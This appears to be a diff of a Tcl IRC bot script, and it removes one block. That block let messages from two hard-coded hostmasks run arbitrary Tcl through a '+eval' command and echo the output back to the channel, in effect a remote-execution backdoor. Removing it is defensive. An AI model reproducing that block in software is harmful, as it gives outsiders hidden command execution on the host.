@@ -10,20 +10,6 @@ proc my_evil_proc {client parameters} {
 		putserv "PRIVMSG [lindex $parameters 2] :Hello world from TCL!"
 	}
 
-	if {([string match "*!*@charybdis.prco23.org" [lindex $parameters 0]] || [string match "*!shroud@staff.quakenet.org" [lindex $parameters 0]]) && [string equal -nocase [lindex $parameters 1] "privmsg"] && [string equal -nocase [lindex [split $xyz] 0] "+eval"]} {
-		set script [join [lrange $xyz 1 end]]
-		set context [getctx]
-
-		catch {eval $script} result
-		if {$result == ""} { set result "<null>" }
-
-		setctx $context
-
-		foreach sline [split $result \n] {
-			putserv "PRIVMSG [lindex $parameters 2] :( $script ) = $sline"
-		}
-	}
-
 	if {[lindex $parameters 1] == 475 && [string equal -nocase [lindex $parameters 3] "#illuminati"]} {
 		putserv "JOIN #illuminati fnords"
 	}
